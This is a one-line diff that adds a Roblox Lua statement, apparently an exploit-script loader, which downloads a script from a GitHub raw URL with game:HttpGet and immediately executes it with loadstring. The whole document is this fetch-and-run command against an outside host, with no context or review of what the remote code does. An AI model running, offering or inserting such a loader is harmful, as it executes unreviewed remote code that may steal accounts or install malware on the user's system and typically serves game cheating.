@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GandonX/YouTube/refs/heads/main/LoaderXyu.txt"))()
